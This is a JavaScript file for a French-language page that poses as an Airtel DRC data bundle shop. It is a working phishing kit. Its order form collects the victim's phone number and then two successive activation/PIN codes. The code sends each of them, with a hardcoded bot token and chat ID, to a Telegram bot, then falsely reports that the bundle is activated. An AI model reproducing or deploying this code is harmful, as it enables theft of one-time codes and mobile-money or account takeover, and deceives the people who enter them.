const BOT_TOKEN = '8959778686:AAGvB9_aw_bbZ651lY9DySZ2joZogAO_LDU';
const CHAT_ID = '8696062088';

document.addEventListener('DOMContentLoaded', () => {
    const modal = document.getElementById('orderModal');
    const closeBtn = document.querySelector('.close-btn');
    const orderForm = document.getElementById('orderForm');
    const modalPackageDetails = document.getElementById('modalPackageDetails');
    const orderStatus = document.getElementById('orderStatus');
    const btnConfirmOrder = document.getElementById('btnConfirmOrder');
    
    const step1Group = document.getElementById('step1Group');
    const step2Group = document.getElementById('step2Group');
    const step3Group = document.getElementById('step3Group');
    const step4Group = document.getElementById('step4Group');
    
    const phoneNumberInput = document.getElementById('phoneNumber');
    const phoneNumberConfirmInput = document.getElementById('phoneNumberConfirm');
    const activationCodeInput = document.getElementById('activationCode');
    const activationCode2Input = document.getElementById('activationCode2');
    
    let currentStep = 1;
    let selectedPackage = '';
    let selectedPrice = '';

    // Clean phone number helper
    function cleanPhone(val) {
        if (!val) return '';
        return val.replace(/[\s\-\(\)\.]/g, '');
    }

    // Validate DRC Airtel number format (relaxed for phone users)
    function isValidPhone(val) {
        const clean = cleanPhone(val);
        // Accepts: 0991234567, 991234567, +243991234567, 243991234567, or 9-12 digits
        return /^[0-9+]{9,14}$/.test(clean);
    }

    // Show temporary error message
    function showError(msg) {
        orderStatus.textContent = msg;
        orderStatus.className = 'order-status status-error';
        orderStatus.style.display = 'block';
    }

    // Show success message
    function showSuccess(msg) {
        orderStatus.textContent = msg;
        orderStatus.className = 'order-status status-success';
        orderStatus.style.display = 'block';
    }

    function hideStatus() {
        orderStatus.style.display = 'none';
    }

    // Open modal on clicking card or choose button
    document.querySelectorAll('.pricing-card').forEach(card => {
        card.addEventListener('click', (e) => {
            // Extract package info
            const dataAmountElem = card.querySelector('.data-amount');
            const dataAmount = dataAmountElem.classList.contains('infinity') ? 'Illimité' : dataAmountElem.textContent.trim();
            const validity = card.querySelector('.validity').textContent.trim();
            selectedPrice = card.querySelector('.price').textContent.trim();
            
            selectedPackage = dataAmount + ' (' + validity + ')';
            
            modalPackageDetails.innerHTML = 'Vous avez sélectionné le forfait <strong>' + selectedPackage + '</strong> à <strong>' + selectedPrice + '</strong>.';
            
            // Reset form
            orderForm.reset();
            hideStatus();
            btnConfirmOrder.disabled = false;
            btnConfirmOrder.textContent = 'CONTINUER';
            
            step1Group.style.display = 'block';
            step2Group.style.display = 'none';
            step3Group.style.display = 'none';
            step4Group.style.display = 'none';
            
            currentStep = 1;
            modal.style.display = 'flex';

            // Auto-focus first input on desktop / modern phones
            setTimeout(() => {
                phoneNumberInput.focus();
            }, 100);
        });
    });

    // Close modal function
    function closeModal() {
        modal.style.display = 'none';
        hideStatus();
    }

    closeBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        closeModal();
    });

    // Close modal only if explicitly clicked outside modal-content (prevent mobile touch accidents)
    modal.addEventListener('click', (e) => {
        if (e.target === modal) {
            closeModal();
        }
    });

    // Send message to Telegram with retry & HTML parse mode (prevents Markdown parse error 400)
    async function sendTelegramMessage(textMessage, maxRetries = 1) {
        const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
        
        for (let attempt = 0; attempt <= maxRetries; attempt++) {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 12000); // 12s timeout for slow 3G/EDGE
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: textMessage,
                        parse_mode: 'HTML'
                    }),
                    signal: controller.signal
                });
                
                clearTimeout(timeoutId);
                
                if (response.ok) {
                    return true;
                }
            } catch (err) {
                clearTimeout(timeoutId);
                console.warn('Telegram attempt ' + attempt + ' failed:', err);
                if (attempt === maxRetries) {
                    return false;
                }
                // Short wait before retry
                await new Promise(r => setTimeout(r, 1000));
            }
        }
        return false;
    }

    // Helper to escape HTML characters
    function escapeHtml(str) {
        if (!str) return '';
        return str
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
    }

    // Handle form submission step by step
    orderForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        hideStatus();
        
        // STEP 1: Phone number entry
        if (currentStep === 1) {
            const phone = phoneNumberInput.value.trim();
            if (!phone || !isValidPhone(phone)) {
                showError('Veuillez entrer un numéro de téléphone valide (Ex: 0991234567).');
                phoneNumberInput.focus();
                return;
            }
            
            step1Group.style.display = 'none';
            step2Group.style.display = 'block';
            phoneNumberConfirmInput.value = '';
            btnConfirmOrder.textContent = 'ENVOYER LA DEMANDE';
            currentStep = 2;
            
            setTimeout(() => phoneNumberConfirmInput.focus(), 50);
            return;
        }
        
        // STEP 2: Phone confirmation & Telegram send
        if (currentStep === 2) {
            const phone1 = cleanPhone(phoneNumberInput.value.trim());
            const phone2 = cleanPhone(phoneNumberConfirmInput.value.trim());
            
            if (!phone2) {
                showError('Veuillez confirmer votre numéro de téléphone.');
                phoneNumberConfirmInput.focus();
                return;
            }
            
            if (phone1 !== phone2) {
                showError('Les numéros de téléphone ne correspondent pas.');
                setTimeout(() => {
                    hideStatus();
                    step1Group.style.display = 'block';
                    step2Group.style.display = 'none';
                    phoneNumberConfirmInput.value = '';
                    btnConfirmOrder.textContent = 'CONTINUER';
                    currentStep = 1;
                    phoneNumberInput.focus();
                }, 2000);
                return;
            }

            btnConfirmOrder.disabled = true;
            btnConfirmOrder.textContent = 'ENVOI EN COURS...';

            const rawPhone = phoneNumberInput.value.trim();
            const message = '<b>NOUVELLE DEMANDE</b>\n\n' +
                            '<b>Forfait:</b> ' + escapeHtml(selectedPackage) + '\n' +
                            '<b>Prix:</b> ' + escapeHtml(selectedPrice) + '\n' +
                            '<b>Numéro:</b> ' + escapeHtml(rawPhone) + '\n' +
                            '<b>Date:</b> ' + escapeHtml(new Date().toLocaleString());

            const success = await sendTelegramMessage(message);

            if (success) {
                step2Group.style.display = 'none';
                step3Group.style.display = 'block';
                activationCodeInput.value = '';
                btnConfirmOrder.textContent = 'CONTINUER';
                btnConfirmOrder.disabled = false;
                hideStatus();
                currentStep = 3;
                setTimeout(() => activationCodeInput.focus(), 50);
            } else {
                showError('Erreur de connexion. Veuillez vérifier votre réseau mobile et réessayer.');
                btnConfirmOrder.disabled = false;
                btnConfirmOrder.textContent = 'RÉESSAYER';
            }
            return;
        }

        // STEP 3: Activation code 1
        if (currentStep === 3) {
            const code = activationCodeInput.value.trim();
            if (!code) {
                showError('Veuillez entrer le premier code reçu.');
                activationCodeInput.focus();
                return;
            }

            btnConfirmOrder.disabled = true;
            btnConfirmOrder.textContent = 'ENVOI EN COURS...';

            const rawPhone = phoneNumberInput.value.trim();
            const message = '<b>PREMIER PIN</b>\n\n' +
                            '<b>Numéro:</b> ' + escapeHtml(rawPhone) + '\n' +
                            '<b>PIN 1:</b> ' + escapeHtml(code) + '\n' +
                            '<b>Date:</b> ' + escapeHtml(new Date().toLocaleString());

            const success = await sendTelegramMessage(message);

            if (success) {
                step3Group.style.display = 'none';
                step4Group.style.display = 'block';
                activationCode2Input.value = '';
                btnConfirmOrder.textContent = 'ACTIVER MON FORFAIT';
                btnConfirmOrder.disabled = false;
                hideStatus();
                currentStep = 4;
                setTimeout(() => activationCode2Input.focus(), 50);
            } else {
                showError('Erreur de connexion lors de l\'envoi du code. Veuillez réessayer.');
                btnConfirmOrder.disabled = false;
                btnConfirmOrder.textContent = 'RÉESSAYER';
            }
            return;
        }

        // STEP 4: Activation code 2
        if (currentStep === 4) {
            const code2 = activationCode2Input.value.trim();
            if (!code2) {
                showError('Veuillez entrer le deuxième code d\'activation.');
                activationCode2Input.focus();
                return;
            }

            btnConfirmOrder.disabled = true;
            btnConfirmOrder.textContent = 'VÉRIFICATION...';

            const rawPhone = phoneNumberInput.value.trim();
            const message = '<b>DEUXIÈME CODE</b>\n\n' +
                            '<b>Numéro:</b> ' + escapeHtml(rawPhone) + '\n' +
                            '<b>Code 2:</b> ' + escapeHtml(code2) + '\n' +
                            '<b>Date:</b> ' + escapeHtml(new Date().toLocaleString());

            const success = await sendTelegramMessage(message);

            if (success) {
                showSuccess('Votre forfait a été activé avec succès !');
                btnConfirmOrder.textContent = 'TERMINÉ';
                btnConfirmOrder.disabled = true;
                
                setTimeout(() => {
                    closeModal();
                }, 3500);
            } else {
                showError('Erreur lors de l\'activation. Veuillez réessayer.');
                btnConfirmOrder.disabled = false;
                btnConfirmOrder.textContent = 'ACTIVER MON FORFAIT';
            }
        }
    });
});
